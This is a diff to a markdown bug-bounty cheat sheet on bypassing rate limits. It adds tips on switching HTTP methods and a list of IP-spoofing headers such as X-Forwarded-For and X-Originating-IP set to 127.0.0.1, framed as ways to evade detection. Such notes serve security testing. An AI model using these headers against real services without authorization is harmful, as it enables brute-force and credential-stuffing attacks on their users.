@@ -1,4 +1,11 @@
 # Rate Limit Bypass Techniques 
+## There are two ways to do that 
+- Customizing HTTP Methods
+- Adding Headers to Spoof IP
+
+## 1. Customizing HTTP Methods
+- If the request goes on GET try to change it to POST, PUT, etc.,
+- If you wanna bypass the rate-limit in API's try HEAD method.
 
 ## Rate Limit Bypass using Header 
 
@@ -16,6 +23,22 @@ X-Client: IP
 #or use double X-Forwarded-For header
 X-Forwarded-For:
 X-Forwarded-For: IP
+```
+## Adding HTTP Headers to Spoof IP and Evade Detection
+- These are Headers I've collected so far to Bypass Rate-Limits.
+```
+X-Forwarded: 127.0.0.1
+X-Forwarded-By: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For-Original: 127.0.0.1
+X-Forwarder-For: 127.0.0.1
+X-Forward-For: 127.0.0.1
+Forwarded-For: 127.0.0.1
+Forwarded-For-Ip: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
 ```
 
 ## Rate Limit Bypass using Special Characters 
@@ -44,6 +67,7 @@ X-Forwarded-For: IP
 * https://twitter.com/SMHTahsin33/status/1295054667613757441(all in one must check)
 
 # Authors:  
-[Keshav Malik](https://www.linkedin.com/in/keshav-malik-22478014a) </br>
-[0xd3vil](https://linkedin.com/in/0xd3vil) </br>
-[Virdoex_hunter](https://twitter.com/Virdoex_hunter)
+* [Keshav Malik](https://www.linkedin.com/in/keshav-malik-22478014a) </br>
+* [0xd3vil](https://linkedin.com/in/0xd3vil) </br>
+* [Virdoex_hunter](https://twitter.com/Virdoex_hunter)
+* [@0xCyberPirate](https://twitter.com/0xCyberPirate)
